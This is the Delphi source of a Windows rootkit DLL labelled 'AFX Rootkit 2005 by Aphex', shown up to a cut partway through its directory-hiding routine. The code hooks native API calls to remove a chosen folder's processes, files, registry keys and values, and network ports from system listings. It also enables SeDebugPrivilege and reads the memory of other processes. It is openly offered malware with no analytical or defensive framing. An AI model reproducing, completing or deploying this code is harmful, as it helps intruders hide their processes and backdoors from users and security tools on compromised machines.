{
  AFX Rootkit 2005 by Aphex
  http://www.iamaphex.net
  aphex@iamaphex.net
}

library hook;

uses
  Windows,
  afxCodeHook,
  Winsock,
  ShellApi,
  PsApi,
  WinSvc,
  Native,
  JwaWinType,
  JwaWinSvc,
  tlhelp32;

type
  TMainThreadInfo = record
    pSleep: pointer;
  end;

const
  Advapi = 'advapi32';
  Kernel = 'kernel32';
  Ntdll = 'ntdll';
  Shell = 'shell32';

var
  szDllPath: pchar = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX';
  DllPath: string = '';
  Root: string = '';

var
  Ports: array of word;
  PortCount: dword;

var
  CreateProcessANextHook: function(lpApplicationName: PAnsiChar; lpCommandLine: PAnsiChar; lpProcessAttributes, lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PAnsiChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
  CreateProcessWNextHook: function(lpApplicationName: PWideChar; lpCommandLine: PWideChar; lpProcessAttributes, lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PWideChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
  CreateProcessAsUserANextHook: function(hToken: THandle; lpApplicationName: PAnsiChar; lpCommandLine: PAnsiChar; lpProcessAttributes: PSecurityAttributes; lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PAnsiChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
  CreateProcessAsUserWNextHook: function(hToken: THandle; lpApplicationName: PWideChar; lpCommandLine: PWideChar; lpProcessAttributes: PSecurityAttributes; lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PWideChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
  CreateProcessWithLogonWNextHook: function(lpUsername, lpDomain, lpPassword: PWideChar; dwLogonFlags: dword; lpApplicationName: PWideChar; lpCommandLine: PWideChar; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PWideChar; const lpStartupInfo: tSTARTUPINFO; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
  EnumProcessModulesNextHook: function(hProcess: Cardinal; lphModule: pdword; cb: Cardinal; lpcbNeeded: Cardinal): bool; stdcall;
  EnumServicesStatusANextHook: function(hSCManager: SC_HANDLE; dwServiceType: DWORD; dwServiceState: DWORD; lpServices: LPENUM_SERVICE_STATUSA; cbBufSize: DWORD; var pcbBytesNeeded, lpServicesReturned, lpResumeHandle: DWORD): BOOL; stdcall;
  EnumServicesStatusWNextHook: function(hSCManager: SC_HANDLE; dwServiceType: DWORD; dwServiceState: DWORD; lpServices: LPENUM_SERVICE_STATUSW; cbBufSize: DWORD; var pcbBytesNeeded, lpServicesReturned, lpResumeHandle: DWORD): BOOL; stdcall;
  EnumServicesStatusExANextHook: function(hSCManager: SC_HANDLE; InfoLevel: SC_ENUM_TYPE; dwServiceType: DWORD; dwServiceState: DWORD; lpServices: LPBYTE; cbBufSize: DWORD; var pcbBytesNeeded, lpServicesReturned, lpResumeHandle: DWORD; pszGroupName: LPCSTR): BOOL; stdcall;
  EnumServicesStatusExWNextHook: function(hSCManager: SC_HANDLE; InfoLevel: SC_ENUM_TYPE; dwServiceType: DWORD; dwServiceState: DWORD; lpServices: LPBYTE; cbBufSize: DWORD; var pcbBytesNeeded, lpServicesReturned, lpResumeHandle: DWORD; pszGroupName: LPCWSTR): BOOL; stdcall;
  NtDeviceIoControlFileNextHook: function(FileHandle: HANDLE; Event: HANDLE; ApcRoutine: PIO_APC_ROUTINE; ApcContext: PVOID; IoStatusBlock: PIO_STATUS_BLOCK; IoControlCode: ULONG; InputBuffer: PVOID; InputBufferLength: ULONG; OutputBuffer: PVOID; OutputBufferLength: ULONG): NTSTATUS; stdcall;
  NtEnumerateKeyNextHook: function(KeyHandle: HANDLE; Index: ULONG; KeyInformationClass: KEY_INFORMATION_CLASS; KeyInformation: PVOID; KeyInformationLength: ULONG; ResultLength: PULONG): NTSTATUS; stdcall;
  NtEnumerateValueKeyNextHook: function(KeyHandle: HANDLE; Index: ULONG; KeyValueInformationClass: KEY_VALUE_INFORMATION_CLASS; KeyValueInformation: PVOID; KeyValueInformationLength: ULONG; ResultLength: PULONG): NTSTATUS; stdcall;
  NtQueryDirectoryFileNextHook: function(FileHandle: HANDLE; Event: HANDLE; ApcRoutine: PIO_APC_ROUTINE; ApcContext: PVOID; IoStatusBlock: PIO_STATUS_BLOCK; FileInformation: PVOID; FileInformationLength: ULONG; FileInformationClass: FILE_INFORMATION_CLASS; ReturnSingleEntry: ByteBool; FileName: PUNICODE_STRING; RestartScan: ByteBool): NTSTATUS; stdcall;
  NtQuerySystemInformationNextHook: function(SystemInformationClass: SYSTEM_INFORMATION_CLASS; SystemInformation: PVOID; SystemInformationLength: ULONG; ReturnLength: PULONG): NTSTATUS; stdcall;
  RtlQueryProcessDebugInformationNextHook: function(hProcess: THandle; lpParam: dword; lpBuffer: pointer): dword; stdcall;
  Shell_NotifyIconANextHook: function(dwMessage: DWORD; lpData: PNotifyIconDataA): BOOL; stdcall;
  Shell_NotifyIconWNextHook: function(dwMessage: DWORD; lpData: PNotifyIconDataW): BOOL; stdcall;

var
  FileMap: pointer;

function IntToStr(I: integer): string;
begin
  Str(I, Result);
end;

function StrToInt(S: string): integer;
begin
 Val(S, Result, Result);
end;

function StrCmp(String1, String2: string): boolean;
begin
  if lstrcmpi(pchar(String1), pchar(String2)) = 0 then
  begin
    Result := True;
  end
  else
  begin
    Result := False;
  end;
end;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

function ExtractFileName(FileName: string): string;
begin
  while Pos('\', FileName) <> 0 do Delete(FileName, 1, Pos('\', FileName));
  while Pos('/', FileName) <> 0 do Delete(FileName, 1, Pos('/', FileName));
  Result := FileName;
end;

function ExtractFilePath(FileName: string): string;
begin
  Result := '';
  while ((Pos('\', FileName) <> 0) or (Pos('/', FileName) <> 0)) do
  begin
    Result := Result + Copy(FileName, 1, 1);
    Delete(FileName, 1, 1);
  end;
end;

function GetFolder: string;
var
  FileName: string;
begin
  Result := '';
  DllPath := string(szDllPath);
  FileName := Copy(DllPath, 1, Length(DllPath));
  while ((Pos('\', FileName) <> 0) or (Pos('/', FileName) <> 0)) do
  begin
    Result := Result + Copy(FileName, 1, 1);
    Delete(FileName, 1, 1);
  end;
  Delete(Result, Length(Result), 1);
  while Pos('\', Result) <> 0 do Delete(Result, 1, Pos('\', Result));
  while Pos('/', Result) <> 0 do Delete(Result, 1, Pos('/', Result));
end;

procedure MapMemory;
var
  hFile, dwSize, dwBytesRead: dword;
begin
  hFile := CreateFile(pchar(DllPath), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  dwSize := GetFileSize(hFile, nil);
  GetMem(FileMap, dwSize);
  ReadFile(hFile, FileMap^, dwSize, dwBytesRead, nil);
  CloseHandle(hFile);
end;

procedure SetPrivilege;
var
  OldTokenPrivileges, TokenPrivileges: TTokenPrivileges;
  ReturnLength: dword;
  hToken: THandle;
  Luid: int64;
begin
  OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken);
  LookupPrivilegeValue(nil, 'SeDebugPrivilege', Luid);
  TokenPrivileges.Privileges[0].luid := Luid;
  TokenPrivileges.PrivilegeCount := 1;
  TokenPrivileges.Privileges[0].Attributes := 0;
  AdjustTokenPrivileges(hToken, False, TokenPrivileges, SizeOf(TTokenPrivileges), OldTokenPrivileges, ReturnLength);
  OldTokenPrivileges.Privileges[0].luid := Luid;
  OldTokenPrivileges.PrivilegeCount := 1;
  OldTokenPrivileges.Privileges[0].Attributes := TokenPrivileges.Privileges[0].Attributes or SE_PRIVILEGE_ENABLED;
  AdjustTokenPrivileges(hToken, False, OldTokenPrivileges, ReturnLength, PTokenPrivileges(nil)^, ReturnLength);
end;

function GetPathFromId(Id: dword): string;
type
  TProcessBasicInformation = record
    ExitStatus: Integer;
    PebBaseAddress: Pointer;
    AffinityMask: Integer;
    BasePriority: Integer;
    UniqueProcessID: Integer;
    InheritedFromUniqueProcessID: Integer;
  end;
var
  Process: dword;
  ProcInfo: TProcessBasicInformation;
  BytesRead: dword;
  Usr, Buf: dword;
  Len: word;
  Buffer: PWideChar;
begin
  Result := '';
  Process := OpenProcess(PROCESS_VM_READ or PROCESS_QUERY_INFORMATION, False, Id);
  NtQueryInformationProcess(Process, ProcessBasicInformation, @ProcInfo, SizeOf(TProcessBasicInformation), nil);
  ReadProcessMemory(Process, pointer(dword(ProcInfo.PebBaseAddress) + $10), @Usr, 4, BytesRead);
  ReadProcessMemory(Process, pointer(Usr + $38), @Len, 2, BytesRead);
  GetMem(Buffer, Len);
  try
    ReadProcessMemory(Process, pointer(Usr + $3c), @Buf, 4, BytesRead);
    ReadProcessMemory(Process, pointer(Buf), Buffer, Len, BytesRead);
    Result := WideCharToString(Buffer);
  finally
    FreeMem(Buffer);
  end;
  SetLength(Result, Len div 2);
end;

function IsId(Id: dword): boolean;
var
  Path: string;
begin
  Path := LowerCase(ExtractFilePath(GetPathFromId(Id)));
  Result := Pos(LowerCase('\' + Root + '\'), Path) <> 0;
end;

function IsExplorer(Id: dword): boolean;
var
  Path: string;
begin
  Path := LowerCase(GetPathFromId(Id));
  Result := Pos(LowerCase('explorer.exe'), Path) <> 0;
end;

function IsPort(Port: word): boolean;
var
  PortLoop: dword;
begin
  Result := False;
  for PortLoop := 0 to PortCount - 1 do
  begin
    if PortLoop >= PortCount then Break;
    if Ports[PortLoop] = Port then
    begin
      Result := True;
      Exit;
    end;
  end;
end;

function GetRootServices: string;
var
  ServiceLoop: integer;
  SCManager: SC_Handle;
  nBytesNeeded, nServices, nResumeHandle: dword;
  ServiceStatus: array [0..511] of TEnumServiceStatusProcessA;
begin
  Result := '';
  SCManager := OpenSCManager('', Nil, SC_MANAGER_ALL_ACCESS);
  if SCManager = 0 then Exit;
  nResumeHandle := 0;
  try
    while True do
    begin
      EnumServicesStatusExANextHook(SCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, @ServiceStatus[0], sizeof(ServiceStatus), nBytesNeeded, nServices, nResumeHandle, '');
      for ServiceLoop := 0 to nServices - 1 do begin
        if IsId(ServiceStatus[ServiceLoop].ServiceStatusProcess.dwProcessId) then
        begin
          Result := Result + '|' + LowerCase(ServiceStatus[ServiceLoop].lpServiceName) + '|';
        end;
      end;
      if nBytesNeeded = 0 then Break;
    end;
  finally
    if SCManager > 0 then CloseServiceHandle(SCManager);
  end;
end;

function AddPort(Port: word): boolean;
begin
  Result := False;
  if IsPort(Port) then Exit;
  SetLength(Ports, PortCount + 1);
  Ports[PortCount] := Port;
  Inc(PortCount);
  Result := True;
end;

procedure ClearPorts;
begin
  PortCount := 0;
  SetLength(Ports, PortCount + 1);
end;

procedure UpdatePorts;
type
  TDI_CONNECTION_INFO = record
    State: ULONG;
    Event: ULONG;
    TransmittedTsdus: ULONG;
    ReceivedTsdus: ULONG;
    TransmissionErrors: ULONG;
    ReceiveErrors: ULONG;
    Throughput: ULONG;
    Delay: ULONG;
    SendBufferSize: ULONG;
    ReceiveBufferSize: ULONG;
    Unreliable: BOOL;
  end;
  TDI_CONNECTION_INFORMATION = record
    UserDataLength: ULONG;
    UserData: ULONG;
    OptionsLength: ULONG;
    Options: ULONG;
    RemoteAddressLength: ULONG;
    RemoteAddress: ULONG;
  end;
var
  SystemInformation: PSYSTEM_HANDLE_INFORMATION;
  HandleEntry: SYSTEM_HANDLE_TABLE_ENTRY_INFO;
  ObjectInformation: POBJECT_NAME_INFORMATION;
  IoStatusBlock: IO_STATUS_BLOCK;
  TdiConnectionInfo: TDI_CONNECTION_INFO;
  TdiConnectionInformation: TDI_CONNECTION_INFORMATION;
  Status: NTSTATUS;
  Handle, ProcessId, Bytes, SystemInformationLength, HandlesParsed, ProcessHandle, Duplicate, ObjectInformationLength: dword;
  Port: word;
  HandleName: string;
begin
  ClearPorts;
  GetMem(SystemInformation, 1);
  try
    SystemInformationLength := 1;
    while True do
    begin
      Inc(SystemInformationLength, 1024);
      ReallocMem(SystemInformation, SystemInformationLength);
      Status := NtQuerySystemInformationNextHook(SystemHandleInformation, SystemInformation, SystemInformationLength, @Bytes);
      if Status = NTSTATUS($C0000004) then
        Continue
      else
        Break;
    end;
    for HandlesParsed := 0 to SystemInformation.NumberOfHandles - 1 do
    begin
      HandleEntry := SystemInformation.Handles[HandlesParsed];
      ProcessId := HandleEntry.UniqueProcessId;
      Handle := HandleEntry.HandleValue;
      ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, ProcessId);
      if not DuplicateHandle(ProcessHandle, Handle, GetCurrentProcess, @Duplicate, PROCESS_ALL_ACCESS, False, 0) then
      begin
        CloseHandle(ProcessHandle);
        Continue;
      end;
      GetMem(ObjectInformation, 1);
      try
        ObjectInformationLength := 1;
        while True do
        begin
          Inc(ObjectInformationLength, 1024);
          ReallocMem(ObjectInformation, ObjectInformationLength);
          Status := NtQueryObject(Duplicate, ObjectNameInformation, ObjectInformation, ObjectInformationLength, @Bytes);
          if Status = NTSTATUS($C0000004) then
            Continue
          else
            Break;
        end;
        HandleName := WideCharToString(ObjectInformation.Name.Buffer);
      finally
        FreeMem(ObjectInformation);
      end;
      if ((lstrcmpi(pchar(HandleName), '\device\tcp') = 0) or (lstrcmpi(pchar(HandleName), '\device\udp') = 0)) then
      begin
        if HandleEntry.HandleAttributes = 2 then
        begin
          TdiConnectionInformation.RemoteAddressLength := 4;
          if NtDeviceIoControlFileNextHook(Duplicate, 0, nil, nil, @IoStatusBlock, $210012, @TdiConnectionInformation, SizeOf(TDI_CONNECTION_INFORMATION) - $16, @TdiConnectionInfo, SizeOf(TDI_CONNECTION_INFO)) = 0 then
          begin
            TdiConnectionInformation.RemoteAddressLength := 3;
            if NtDeviceIoControlFileNextHook(Duplicate, 0, nil, nil, @IoStatusBlock, $210012, @TdiConnectionInformation, SizeOf(TDI_CONNECTION_INFORMATION), @TdiConnectionInfo, SizeOf(TDI_CONNECTION_INFO)) = 0 then
            begin
              Port := ntohs(TdiConnectionInfo.ReceivedTsdus and 65535);
              if IsId(ProcessId) then
              begin
                AddPort(Port);
              end;
            end;
          end;
        end
        else
        begin
          TdiConnectionInformation.RemoteAddressLength := 3;
          NtDeviceIoControlFileNextHook(Duplicate, 0, nil, nil, @IoStatusBlock, $210012, @TdiConnectionInformation, SizeOf(TDI_CONNECTION_INFORMATION), @TdiConnectionInfo, SizeOf(TDI_CONNECTION_INFO));
          Port := ntohs(TdiConnectionInfo.ReceivedTsdus and 65535);
          if IsId(ProcessId) then
          begin
            AddPort(Port);
          end;
        end;
      end;
      CloseHandle(ProcessHandle);
      CloseHandle(Duplicate);
    end;
  finally
    FreeMem(SystemInformation);
  end;
end;

function NtQuerySystemInformationHookProc(SystemInformationClass: SYSTEM_INFORMATION_CLASS; SystemInformation: PVOID; SystemInformationLength: ULONG; ReturnLength: PULONG): NTSTATUS; stdcall;
var
  LastProcessInfo, ProcessInfo: PSYSTEM_PROCESSES;
  HandleEntry: SYSTEM_HANDLE_TABLE_ENTRY_INFO;
  HandleInfo: PSYSTEM_HANDLE_INFORMATION;
  HandlesParsed, Offset: dword;
begin
  Result := NtQuerySystemInformationNextHook(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
  if Result <> 0 then Exit;
  if SystemInformationClass = SystemProcessesAndThreadsInformation then
  begin
    Offset := 0;
    LastProcessInfo := nil;
    repeat
      ProcessInfo := PSYSTEM_PROCESSES(pointer(dword(SystemInformation) + Offset));
      if IsId(ProcessInfo.ProcessId) then
      begin
        if ProcessInfo.NextEntryDelta = 0 then
        begin
          if LastProcessInfo <> nil then LastProcessInfo.NextEntryDelta := 0;
          Exit;
        end
        else
        begin
          LastProcessInfo.NextEntryDelta := LastProcessInfo.NextEntryDelta + ProcessInfo.NextEntryDelta;
        end;
      end
      else
      begin
        LastProcessInfo := ProcessInfo;
      end;
      Offset := Offset + ProcessInfo.NextEntryDelta;
    until ProcessInfo.NextEntryDelta = 0;
  end
  else if SystemInformationClass = SystemHandleInformation then
  begin
    HandleInfo := PSYSTEM_HANDLE_INFORMATION(SystemInformation);
    HandlesParsed := 0;
    while HandlesParsed < HandleInfo.NumberOfHandles do
    begin
      HandleEntry := HandleInfo.Handles[HandlesParsed];
      if IsId(HandleEntry.UniqueProcessId) then
      begin
        ZeroMemory(@HandleInfo.Handles[HandlesParsed], SizeOf(SYSTEM_HANDLE_INFORMATION));
      end;
      Inc(HandlesParsed);
    end;
  end;
end;

function GetValueShift(KeyHandle: dword; Index: ULONG): dword;
var
  KeyValueInformation: KEY_VALUE_BASIC_INFORMATION;
  ResultLength: ULONG;
  ValueLoop: dword;
  RootPath: string;
begin
  Result := 0;
  RootPath := string(Root) + '\';
  ValueLoop := 0;
  while ValueLoop <= Index do
  begin
    ZeroMemory(@KeyValueInformation, SizeOf(KEY_VALUE_BASIC_INFORMATION));
    if NtEnumerateValueKeyNextHook(KeyHandle, Result, KeyValueBasicInformation, @KeyValueInformation, SizeOf(KEY_VALUE_BASIC_INFORMATION), @ResultLength) <> ERROR_SUCCESS then Break;
    byte(pointer(dword(@KeyValueInformation) + ResultLength)^) := 0;
    if not StrCmp(RootPath, ExtractFilePath(WideCharToString(PWideChar(@KeyValueInformation.Name)))) then
    begin
      Inc(ValueLoop);
    end;
    if ValueLoop > Index then Exit;
    Inc(Result);
  end;
end;

function NtEnumerateValueKeyHookProc(KeyHandle: HANDLE; Index: ULONG; KeyValueInformationClass: KEY_VALUE_INFORMATION_CLASS; KeyValueInformation: PVOID; KeyValueInformationLength: ULONG; ResultLength: PULONG): NTSTATUS; stdcall;
begin
  Result := NtEnumerateValueKeyNextHook(KeyHandle, GetValueShift(KeyHandle, Index), KeyValueInformationClass, KeyValueInformation, KeyValueInformationLength, ResultLength);
end;

function GetKeyShift(KeyHandle: dword; Index: ULONG): dword;
var
  KeyInformation: KEY_BASIC_INFORMATION;
  ResultLength: ULONG;
  ValueLoop: dword;
begin
  Result := 0;
  ValueLoop := 0;
  while ValueLoop <= Index do
  begin
    ZeroMemory(@KeyInformation, SizeOf(KEY_BASIC_INFORMATION));
    if NtEnumerateKeyNextHook(KeyHandle, Result, KeyBasicInformation, @KeyInformation, SizeOf(KEY_BASIC_INFORMATION), @ResultLength) <> ERROR_SUCCESS then Break;
    byte(pointer(dword(@KeyInformation) + ResultLength)^) := 0;
    if not StrCmp(Root, WideCharToString(PWideChar(@KeyInformation.Name))) then
    begin
      Inc(ValueLoop);
    end;
    if ValueLoop > Index then Exit;
    Inc(Result);
  end;
end;

function NtEnumerateKeyHookProc(KeyHandle: HANDLE; Index: ULONG; KeyInformationClass: KEY_INFORMATION_CLASS; KeyInformation: PVOID; KeyInformationLength: ULONG; ResultLength: PULONG): NTSTATUS; stdcall;
begin
  Result := NtEnumerateKeyNextHook(KeyHandle, GetKeyShift(KeyHandle, Index), KeyInformationClass, KeyInformation, KeyInformationLength, ResultLength);
end;

function NtDeviceIoControlFileHookProc(FileHandle: HANDLE; Event: HANDLE; ApcRoutine: PIO_APC_ROUTINE; ApcContext: PVOID; IoStatusBlock: PIO_STATUS_BLOCK; IoControlCode: ULONG; InputBuffer: PVOID; InputBufferLength: ULONG; OutputBuffer: PVOID; OutputBufferLength: ULONG): NTSTATUS; stdcall;
type
  TDI_CONNECTION_INFO = record
    State: ULONG;
    Event: ULONG;
    TransmittedTsdus: ULONG;
    ReceivedTsdus: ULONG;
    TransmissionErrors: ULONG;
    ReceiveErrors: ULONG;
    Throughput: ULONG;
    Delay: ULONG;
    SendBufferSize: ULONG;
    ReceiveBufferSize: ULONG;
    Unreliable: BOOL;
  end;
  PTDI_CONNECTION_INFO = ^TDI_CONNECTION_INFO;
type
  TMibTcpRow = record
    dwState: DWORD;
    dwLocalAddr: DWORD;
    dwLocalPort: DWORD;
    dwRemoteAddr: DWORD;
    dwRemotePort: DWORD;
  end;
  PMibTcpRow = ^TMibTcpRow;
  TMibUdpRow = record
    dwLocalAddr: DWORD;
    dwLocalPort: DWORD;
  end;
  PMibUdpRow = ^TMibUdpRow;
  TMibTcpRowEx = record
    dwState: DWORD;
    dwLocalAddr: DWORD;
    dwLocalPort: DWORD;
    dwRemoteAddr: DWORD;
    dwRemotePort: DWORD;
    dwProcessId: DWORD;
  end;
  PMibTcpRowEx = ^TMibTcpRow;
  TMibUdpRowEx = record
    dwLocalAddr: DWORD;
    dwLocalPort: DWORD;
    dwProcessId: DWORD;
  end;
  PMibUdpRowEx = ^TMibUdpRowEx;
var
  MibTcpRow, NextMibTcpRow: PMibTcpRow;
  MibTcpRowEx, NextMibTcpRowEx: PMibTcpRowEx;
  MibUdpRow, NextMibUdpRow: PMibUdpRow;
  MibUdpRowEx, NextMibUdpRowEx: PMibUdpRowEx;
  Size: dword;
  Rows: dword;
begin
  Result := NtDeviceIoControlFileNextHook(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength);
  if Result <> 0 then Exit;
  if IoControlCode = $210012 then
  begin
    if OutputBufferLength = SizeOf(TDI_CONNECTION_INFO) then
    begin
      if IsPort(ntohs(PTDI_CONNECTION_INFO(OutputBuffer).ReceivedTsdus and 65535)) then
      begin
        ZeroMemory(OutputBuffer, OutputBufferLength);
        IoStatusBlock.Status := $141;
        IoStatusBlock.Information := 0;
      end;
    end;
  end;
  if IoControlCode <> $120003 then Exit;
  if InputBufferLength = 36 then
  begin
    if ((pchar(InputBuffer)[1] = #4) and (pchar(InputBuffer)[17] = #1)) then
    begin
      UpdatePorts;
      if pchar(InputBuffer)[0] = #0 then
      begin
        if pchar(InputBuffer)[16] = #1 then
        begin
          Size := IoStatusBlock.Information div SizeOf(TMibTcpRow);
          Rows := 0;
          while Rows < Size do
          begin
            MibTcpRow := PMibTcpRow(pointer(dword(OutputBuffer) + (Rows * SizeOf(TMibTcpRow))));
            if IsPort(ntohs(MibTcpRow.dwLocalPort)) then
            begin
              NextMibTcpRow := pointer(dword(MibTcpRow) + SizeOf(TMibTcpRow));
              CopyMemory(MibTcpRow, NextMibTcpRow, IoStatusBlock.Information - (dword(NextMibTcpRow) - dword(OutputBuffer)));
              Dec(IoStatusBlock.Information, SizeOf(TMibTcpRow));
              Size := IoStatusBlock.Information div SizeOf(TMibTcpRow);
            end
            else
            begin
              Inc(Rows);
            end;
          end;
        end
        else if pchar(InputBuffer)[16] = #2 then
        begin
          Size := IoStatusBlock.Information div SizeOf(TMibTcpRowEx);
          Rows := 0;
          while Rows < Size do
          begin
            MibTcpRowEx := PMibTcpRowEx(pointer(dword(OutputBuffer) + (Rows * SizeOf(TMibTcpRowEx))));
            if IsPort(ntohs(MibTcpRowEx.dwLocalPort)) then
            begin
              NextMibTcpRowEx := pointer(dword(MibTcpRowEx) + SizeOf(TMibTcpRowEx));
              CopyMemory(MibTcpRowEx, NextMibTcpRowEx, IoStatusBlock.Information - (dword(NextMibTcpRowEx) - dword(OutputBuffer)));
              Dec(IoStatusBlock.Information, SizeOf(TMibTcpRowEx));
              Size := IoStatusBlock.Information div SizeOf(TMibTcpRowEx);
            end
            else
            begin
              Inc(Rows);
            end;
          end;
        end;
      end
      else if pchar(InputBuffer)[0] = #1 then
      begin
        if pchar(InputBuffer)[16] = #1 then
        begin
          Size := IoStatusBlock.Information div SizeOf(TMibUdpRow);
          Rows := 0;
          while Rows < Size do
          begin
            MibUdpRow := PMibUdpRow(pointer(dword(OutputBuffer) + (Rows * SizeOf(TMibUdpRow))));
            if IsPort(ntohs(MibUdpRow.dwLocalPort)) then
            begin
              NextMibUdpRow := pointer(dword(MibUdpRow) + SizeOf(TMibUdpRow));
              CopyMemory(MibUdpRow, NextMibUdpRow, IoStatusBlock.Information - (dword(NextMibUdpRow) - dword(OutputBuffer)));
              Dec(IoStatusBlock.Information, SizeOf(TMibUdpRow));
              Size := IoStatusBlock.Information div SizeOf(TMibUdpRow);
            end
            else
            begin
              Inc(Rows);
            end;
          end;
        end
        else if pchar(InputBuffer)[16] = #2 then
        begin
          Size := IoStatusBlock.Information div SizeOf(TMibUdpRowEx);
          Rows := 0;
          while Rows < Size do
          begin
            MibUdpRowEx := PMibUdpRowEx(pointer(dword(OutputBuffer) + (Rows * SizeOf(TMibUdpRowEx))));
            if IsPort(ntohs(MibUdpRowEx.dwLocalPort)) then
            begin
              NextMibUdpRowEx := pointer(dword(MibUdpRowEx) + SizeOf(TMibUdpRowEx));
              CopyMemory(MibUdpRowEx, NextMibUdpRowEx, IoStatusBlock.Information - (dword(NextMibUdpRowEx) - dword(OutputBuffer)));
              Dec(IoStatusBlock.Information, SizeOf(TMibUdpRowEx));
              Size := IoStatusBlock.Information div SizeOf(TMibUdpRowEx);
            end
            else
            begin
              Inc(Rows);
            end;
          end;
        end;
      end;
    end;
  end;
end;

function NtQueryDirectoryFileHookProc(FileHandle: HANDLE; Event: HANDLE; ApcRoutine: PIO_APC_ROUTINE; ApcContext: PVOID; IoStatusBlock: PIO_STATUS_BLOCK; FileInformation: PVOID; FileInformationLength: ULONG; FileInformationClass: FILE_INFORMATION_CLASS; ReturnSingleEntry: ByteBool; FileName: PUNICODE_STRING; RestartScan: ByteBool): NTSTATUS; stdcall;
var
  Offset: dword;
  Name: string;
  LastFileDirectoryInfo, FileDirectoryInfo: PFILE_DIRECTORY_INFORMATION;
  LastFileFullDirectoryInfo, FileFullDirectoryInfo: PFILE_FULL_DIRECTORY_INFORMATION;
  LastFileBothDirectoryInfo, FileBothDirectoryInfo: PFILE_BOTH_DIRECTORY_INFORMATION;
  LastFileNamesInfo, FileNamesInfo: PFILE_NAMES_INFORMATION;
begin
  Result := NtQueryDirectoryFileNextHook(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, FileInformationLength, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
  if Result <> 0 then Exit;
  Offset := 0;
  case dword(FileInformationClass) of
    1:
      begin
        FileDirectoryInfo := nil;
        repeat
          LastFileDirectoryInfo := FileDirectoryInfo;
          FileDirectoryInfo := PFILE_DIRECTORY_INFORMATION(pointer(dword(FileInformation) + Offset));
          Name := Copy(WideCharToString(FileDirectoryInfo.FileName), 1, FileDirectoryInfo.FileNameLength div 2);
          if StrCmp(Name, Root) then
          begin
            if FileDirectoryInfo.NextEntryOffset = 0 then
            begin
              if LastFileDirectoryInfo <> nil then LastFileDirectoryInfo.NextEntryOffset := 0
              else Result := NTSTATUS($C000000F);
              Exit;
            end
            else
            begin
              LastFileDirectoryInfo.NextEntryOffset := LastFileDirectoryInfo.NextEntryOffset + FileDirectoryInfo.NextEntryOffset;
            end;
          end;
          Offset := Offset + FileDirectoryInfo.NextEntryOffset;
        until FileDirectoryInfo.NextEntryOffset = 0;
      end;
    2:
      begin
        FileFullDirectoryInfo := nil;
        repeat
          LastFileFullDirectoryInfo := FileFullDirectoryInfo;
          FileFullDirectoryInfo := PFILE_FULL_DIRECTORY_INFORMATION(pointer(dword(FileInformation) + Offset));
          Name := Copy(WideCharToString(FileFullDirectoryInfo.FileName), 1, FileFullDirectoryInfo.FileNameLength div 2);
          if StrCmp(Name, Root) then
          begin
            if FileFullDirectoryInfo.NextEntryOffset = 0 then
            begin
              if LastFileFullDirectoryInfo <> nil then LastFileFullDirectoryInfo.NextEntryOffset := 0
              else Result := NTSTATUS($C000000F);
              Exit;
            end
            else
            begin
              LastFileFullDirectoryInfo.NextEntryOffset := LastFileFullDirectoryInfo.NextEntryOffset + FileFullDirectoryInfo.NextEntryOffset;
            end;
          end;
          Offset := Offset + FileFullDirectoryInfo.NextEntryOffset;
        until FileFullDirectoryInfo.NextEntryOffset = 0;
      end;
    3:
      begin
        FileBothDirectoryInfo := nil;
        repeat
          LastFileBothDirectoryInfo := FileBothDirectoryInfo;
          FileBothDirectoryInfo := PFILE_BOTH_DIRECTORY_INFORMATION(pointer(dword(FileInformation) + Offset));
          Name := Copy(WideCharToString(FileBothDirectoryInfo.FileName), 1, FileBothDirectoryInfo.FileNameLength div 2);
          if StrCmp(Name, Root) then
          begin
            if FileBothDirectoryInfo.NextEntryOffset = 0 then
            begin
              if LastFileBothDirectoryInfo <> nil then LastFileBothDirectoryInfo.NextEntryOffset := 0
              else Result := NTSTATUS($C000000F);
              Exit;
            end
            else
            begin
